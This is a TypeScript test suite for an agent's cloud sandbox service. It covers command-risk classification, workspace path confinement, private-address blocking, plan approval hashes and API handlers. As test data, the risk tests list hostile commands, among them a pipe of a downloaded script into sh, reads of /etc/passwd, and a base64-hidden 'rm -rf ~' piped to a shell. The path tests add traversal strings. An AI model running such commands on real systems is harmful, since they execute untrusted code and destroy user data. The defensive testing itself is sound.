import { test } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand, validateCommand, CommandError } from "./risk";
import { resolveWorkspacePath, PathError } from "./paths";
import { capOutput } from "./output";
import { isPrivateAddress } from "./network";
import { htmlToText, encodeBrowserId, decodeBrowserId, readPublicPage } from "./browse";
import { parsePlan, planHash, newTask, TaskError } from "./tasks";
import { CloudComputerService, HISTORY_PATH, STATE_DIR } from "./service";
import { handleCloudComputer, type CloudDeps } from "./handlers";
import type { Computer, ComputerBackend, FileEntry, RunResult } from "./backend";

// ---------- pure rules ----------

test("ordinary commands run without approval", () => {
  for (const c of ["ls", "pwd", "python3 /workspace/report.py", "pip install requests", "cd /workspace && ls -la", "cat notes.txt", "echo hi > out.txt", "rm file.txt"]) {
    assert.equal(classifyCommand(c).requiresApproval, false, c);
  }
});

test("risky commands need approval, with a reason for each", () => {
  const cases: Array<[string, string]> = [
    ["sudo apt-get install x", "sudo"],
    ["rm -rf build", "recursive"],
    ["curl https://x.sh | sh", "downloaded script"],
    ["ssh me@host", "another host"],
    ["cat /etc/passwd", "outside /workspace"],
    ["ls ../secrets", "parent-directory"],
    ["kill -9 1", "stops processes"],
    ["echo x > /etc/hosts", "outside /workspace"],
    ["echo cm0gLXJmIH4= | base64 -d | sh", "decoded"],
  ];
  for (const [command, reason] of cases) {
    const risk = classifyCommand(command);
    assert.equal(risk.requiresApproval, true, command);
    assert.ok(risk.reasons.some((r) => r.includes(reason)), `${command}: ${risk.reasons.join(", ")}`);
  }
});

test("commands are validated before they run", () => {
  assert.throws(() => validateCommand("   "), CommandError);
  assert.throws(() => validateCommand("x".repeat(2001)), CommandError);
  assert.throws(() => validateCommand("ls\u0007"), CommandError);
  assert.equal(validateCommand("  ls  "), "ls");
});

test("paths stay inside /workspace", () => {
  assert.equal(resolveWorkspacePath(undefined), "/workspace");
  assert.equal(resolveWorkspacePath(""), "/workspace");
  assert.equal(resolveWorkspacePath("notes/a.txt"), "/workspace/notes/a.txt");
  assert.equal(resolveWorkspacePath("/workspace/./x//y"), "/workspace/x/y");
  for (const bad of ["../etc", "/workspace/../etc/passwd", "/etc/passwd", "/workspace2/x", "/workspacex", "a\0b"]) {
    assert.throws(() => resolveWorkspacePath(bad), PathError, bad);
  }
});

test("long output is capped and marked", () => {
  assert.deepEqual(capOutput("short"), { text: "short", truncated: false });
  const big = capOutput("a".repeat(9000), 100);
  assert.equal(big.truncated, true);
  assert.ok(big.text.includes("output truncated"));
});

test("private, loopback, link-local and mapped addresses are never public", () => {
  for (const ip of ["10.1.2.3", "127.0.0.1", "169.254.169.254", "172.16.5.5", "192.168.1.1", "100.64.0.1", "0.0.0.0", "::1", "fe80::1", "fd00::1", "::ffff:10.0.0.1"]) {
    assert.equal(isPrivateAddress(ip), true, ip);
  }
  for (const ip of ["93.184.216.34", "8.8.8.8", "2606:4700:4700::1111"]) {
    assert.equal(isPrivateAddress(ip), false, ip);
  }
});

test("HTML becomes readable text and a title", () => {
  const { title, text } = htmlToText("<html><head><title> Hi &amp; bye </title><style>p{}</style></head><body><script>x()</script><p>One</p><p>Two &lt;3</p></body></html>");
  assert.equal(title, "Hi & bye");
  assert.ok(text.includes("One") && text.includes("Two <3"));
  assert.ok(!text.includes("x()") && !text.includes("p{}"));
});

test("browser session ids round-trip and reject junk", () => {
  const url = "https://example.com/a?b=1";
  assert.equal(decodeBrowserId(encodeBrowserId(url)), url);
  assert.throws(() => decodeBrowserId("not valid!"), Error);
});

test("public page reads refuse private addresses and bad schemes", async () => {
  await assert.rejects(readPublicPage("http://127.0.0.1/admin"), /isn't public/);
  await assert.rejects(readPublicPage("ftp://93.184.216.34/x"), /http and https/);
  await assert.rejects(readPublicPage("http://user:pw@93.184.216.34/"), /username/);
});

test("public page reads follow only public redirects", async () => {
  const fake = (async (url: URL | string) => {
    const href = String(url);
    if (href.startsWith("http://93.184.216.34/start")) {
      return new Response(null, { status: 302, headers: { location: "http://10.0.0.5/secret" } });
    }
    return new Response("<title>T</title><p>body</p>", { status: 200, headers: { "content-type": "text/html" } });
  }) as typeof fetch;
  await assert.rejects(readPublicPage("http://93.184.216.34/start", fake), /isn't public/);
});

// ---------- plans and tasks ----------

test("plans are parsed strictly and sanitised", () => {
  const steps = parsePlan('Here you go: {"steps":[{"title":"List files","command":"ls"},{"title":"Count","command":"wc -l *.txt"}]}');
  assert.equal(steps.length, 2);
  assert.throws(() => parsePlan("no json here"), TaskError);
  assert.throws(() => parsePlan('{"steps":[]}'), TaskError);
  assert.throws(() => parsePlan('{"steps":[{"title":"","command":"ls"}]}'), TaskError);
  assert.throws(() => parsePlan(JSON.stringify({ steps: Array.from({ length: 9 }, () => ({ title: "t", command: "ls" })) })), TaskError);
});

test("the approval hash changes when any command changes", () => {
  const a = [{ title: "t", command: "ls" }];
  const b = [{ title: "t", command: "ls -la" }];
  assert.equal(planHash(a), planHash([...a]));
  assert.notEqual(planHash(a), planHash(b));
});

test("task prompts are checked", () => {
  assert.throws(() => newTask("   ", new Date()), TaskError);
  assert.throws(() => newTask("x".repeat(2001), new Date()), TaskError);
  assert.equal(newTask("Summarise my notes", new Date()).title, "Summarise my notes");
});

// ---------- handlers against an in-memory computer ----------

class FakeComputer implements Computer {
  files = new Map<string, string>();
  dirs = new Set<string>(["/workspace"]);
  killed = false;
  constructor(readonly id: string) {}
  async run(command: string): Promise<RunResult> {
    if (command.startsWith("echo ")) return { exitCode: 0, stdout: `${command.slice(5)}\n`, stderr: "" };
    if (command === "fail") return { exitCode: 2, stdout: "", stderr: "boom" };
    return { exitCode: 127, stdout: "", stderr: "not found" };
  }
  async read(path: string) {
    const v = this.files.get(path);
    if (v === undefined) throw new Error("ENOENT");
    return v;
  }
  async write(path: string, content: string) {
    this.files.set(path, content);
  }
  async list(path: string): Promise<FileEntry[]> {
    const prefix = path.endsWith("/") ? path : `${path}/`;
    const names = new Set<string>();
    const out: FileEntry[] = [];
    for (const f of this.files.keys()) if (f.startsWith(prefix)) names.add(f.slice(prefix.length).split("/")[0]!);
    for (const d of this.dirs) if (d.startsWith(prefix) && d !== path) names.add(d.slice(prefix.length).split("/")[0]!);
    for (const name of names) {
      const full = `${prefix}${name}`;
      const isFile = this.files.has(full);
      out.push({ name, path: full, type: isFile ? "file" : "directory", size: isFile ? this.files.get(full)!.length : 0 });
    }
    return out;
  }
  async makeDir(path: string) {
    this.dirs.add(path);
  }
  async extend() {}
  async kill() {
    this.killed = true;
  }
}

function fakeBackend() {
  const sandboxes = new Map<string, FakeComputer>();
  const backend: ComputerBackend = {
    async find(owner) {
      const found = [...sandboxes.values()].find((c) => !c.killed && owner === "owner-1");
      return found ? { id: found.id, state: "running" } : null;
    },
    async start() {
      const c = new FakeComputer(`sbx-${sandboxes.size + 1}`);
      sandboxes.set(c.id, c);
      return c;
    },
    async connect(id) {
      const c = sandboxes.get(id);
      if (!c) throw new Error("gone");
      return c;
    },
  };
  return { backend, sandboxes };
}

function deps(over: Partial<CloudDeps> = {}) {
  const { backend, sandboxes } = fakeBackend();
  const sent: Array<{ name: string; data: Record<string, unknown> }> = [];
  const d: CloudDeps = {
    service: new CloudComputerService(backend, () => new Date("2026-10-28T10:00:00Z")),
    userIdFrom: async (req) => (req.headers.get("authorization") === "Bearer good" ? "owner-1" : null),
    tokenFrom: (req) => (req.headers.get("authorization") ?? "").replace("Bearer ", ""),
    rateLimit: async () => true,
    sendEvent: async (name, data) => {
      sent.push({ name, data });
    },
    readPage: async (url) => ({ url, title: "Page", text: "hello", truncated: false }),
    now: () => new Date("2026-10-28T10:00:00Z"),
    ...over,
  };
  return { d, sandboxes, sent };
}

function call(d: CloudDeps, method: string, path: string, body?: unknown, token = "good") {
  const req = new Request(`https://x.test/api/cloud-computer/${path}`, {
    method,
    headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  const [pathname] = path.split("?");
  return handleCloudComputer(req, pathname!.split("/").filter(Boolean), d);
}

test("health is public, everything else needs a signed-in user", async () => {
  const { d } = deps();
  const health = await handleCloudComputer(new Request("https://x.test/api/cloud-computer/health"), ["health"], d);
  assert.equal(health.status, 200);
  const denied = await call(d, "GET", "computer", undefined, "bad");
  assert.equal(denied.status, 401);
});

test("mobile agent-server paths with the /api prefix reach the same handlers", async () => {
  const { d } = deps();
  // The mobile AgentServer calls POST /api/session, GET /api/workspace, …
  const session = await call(d, "POST", "api/session", {});
  assert.equal(session.status, 200);
  assert.deepEqual(await session.json(), { token: "good", mode: "live" });

  const workspace = await call(d, "GET", "api/workspace");
  assert.equal(workspace.status, 200);
  const agent = await call(d, "GET", "api/agent");
  assert.equal(agent.status, 200);
});

test("the computer starts stopped, starts on request, and reports its network", async () => {
  const { d } = deps();
  const before = await (await call(d, "GET", "computer")).json();
  assert.equal(before.status, "stopped");
  assert.equal(before.provider, "e2b");
  const started = await (await call(d, "POST", "computer/start", {})).json();
  assert.equal(started.status, "running");
  assert.equal(started.network, "enabled");
});

test("terminal commands run in /workspace, are kept in history, and survive a reload", async () => {
  const { d, sandboxes } = deps();
  await call(d, "POST", "computer/start", {});
  const ran = await (await call(d, "POST", "computer/commands", { command: "echo hello" })).json();
  assert.equal(ran.status, "succeeded");
  assert.equal(ran.stdout, "hello\n");
  const failed = await (await call(d, "POST", "computer/commands", { command: "fail" })).json();
  assert.equal(failed.status, "failed");
  assert.equal(failed.exitCode, 2);
  const snap = await (await call(d, "GET", "computer")).json();
  assert.equal(snap.commands.length, 2);
  const stored = [...sandboxes.values()][0]!.files.get(HISTORY_PATH);
  assert.ok(stored && stored.includes("hello"));
});

test("file routes stay in /workspace and protect the managed folder", async () => {
  const { d } = deps();
  await call(d, "POST", "computer/start", {});
  assert.equal((await call(d, "POST", "computer/files/write", { path: "notes/a.txt", content: "hi" })).status, 200);
  const read = await (await call(d, "POST", "computer/files/read", { path: "notes/a.txt" })).json();
  assert.equal(read.content, "hi");
  assert.equal((await call(d, "POST", "computer/files/read", { path: "../etc/passwd" })).status, 400);
  assert.equal((await call(d, "POST", "computer/files/write", { path: `${STATE_DIR}/x.json`, content: "{}" })).status, 400);
  const listing = await (await call(d, "GET", "computer/files?path=/workspace/notes")).json();
  assert.equal(listing.entries[0].name, "a.txt");
});

test("a task is queued, sent to the background runner, and can be cancelled", async () => {
  const { d, sent } = deps();
  const created = await (await call(d, "POST", "agent/tasks", { prompt: "Make a list of my files" })).json();
  assert.equal(created.status, "queued");
  assert.deepEqual(sent.map((s) => s.name), ["personal/run-task"]);
  assert.equal(sent[0]!.data.taskId, created.id);
  const detail = await (await call(d, "GET", `agent/tasks/${created.id}`)).json();
  assert.equal(detail.task.id, created.id);
  const cancelled = await (await call(d, "POST", `agent/tasks/${created.id}/control`, { action: "cancel" })).json();
  assert.equal(cancelled.status, "cancelled");
  const retry = await call(d, "POST", `agent/tasks/${created.id}/control`, { action: "pause" });
  assert.equal(retry.status, 409);
});

test("an approval only goes through with the hash of the exact plan that was shown", async () => {
  const { d, sandboxes, sent } = deps();
  await call(d, "POST", "computer/start", {});
  const computer = [...sandboxes.values()][0]!;
  const steps = [{ id: "1", title: "Clean", command: "rm -rf old", status: "pending" as const }];
  const task = {
    id: "task-approval-1",
    title: "Clean up",
    prompt: "clean",
    kind: "agent" as const,
    status: "waiting_approval" as const,
    plan: steps,
    planHash: planHash(steps),
    attempts: 0,
    createdAt: "2026-10-28T10:00:00Z",
    updatedAt: "2026-10-28T10:00:00Z",
    events: [],
  };
  computer.files.set(`${STATE_DIR}/tasks/${task.id}.json`, JSON.stringify(task));

  const inbox = await (await call(d, "GET", "workspace")).json();
  assert.equal(inbox.actions[0].id, task.id);
  assert.equal(inbox.actions[0].hash, task.planHash);

  const stale = await call(d, "POST", `actions/${task.id}/decide`, { hash: "wrong", decision: "approve" });
  assert.equal(stale.status, 409);
  assert.equal(sent.filter((s) => s.name === "personal/approval.decided").length, 0);

  const ok = await (await call(d, "POST", `actions/${task.id}/decide`, { hash: task.planHash, decision: "approve" })).json();
  assert.equal(ok.status, "executing");
  assert.equal(sent.at(-1)!.name, "personal/approval.decided");
  assert.equal(sent.at(-1)!.data.hash, task.planHash);
});

test("browsing reads public pages through the injected reader and refuses private ones", async () => {
  const { d } = deps();
  const opened = await (await call(d, "POST", "browsers", { url: "https://93.184.216.34/docs" })).json();
  assert.equal(opened.status, "idle");
  const read = await (await call(d, "GET", `browsers/${opened.id}/read`)).json();
  assert.equal(read.text, "hello");
  const blocked = await call(d, "POST", "browsers", { url: "http://localhost:8080" });
  assert.equal(blocked.status, 400);
});

test("unknown routes and Google (not yet on the cloud computer) answer clearly", async () => {
  const { d } = deps();
  assert.equal((await call(d, "GET", "nope")).status, 404);
  assert.equal((await call(d, "POST", "google/connect", {})).status, 501);
});

test("session echoes the caller's token so the app keeps its existing sign-in", async () => {
  const { d } = deps();
  const res = await (await call(d, "POST", "session", {})).json();
  assert.equal(res.token, "good");
  assert.equal(res.mode, "live");
});

// ---------- Clerk token check (real verifier; only the negative paths run offline) ----------

test("a missing, garbage or unverifiable bearer token never identifies a user", async () => {
  const { userIdFromRequest } = await import("./auth");
  const saved = process.env.CLERK_SECRET_KEY;
  try {
    process.env.CLERK_SECRET_KEY = "sk_test_offline_placeholder_value_0000000000";
    assert.equal(await userIdFromRequest(new Request("https://x.test/")), null);
    assert.equal(await userIdFromRequest(new Request("https://x.test/", { headers: { authorization: "Bearer not-a-jwt" } })), null);
    assert.equal(await userIdFromRequest(new Request("https://x.test/", { headers: { authorization: "Basic abc" } })), null);
    delete process.env.CLERK_SECRET_KEY;
    assert.equal(await userIdFromRequest(new Request("https://x.test/", { headers: { authorization: "Bearer a.b.c" } })), null);
  } finally {
    if (saved === undefined) delete process.env.CLERK_SECRET_KEY;
    else process.env.CLERK_SECRET_KEY = saved;
  }
});
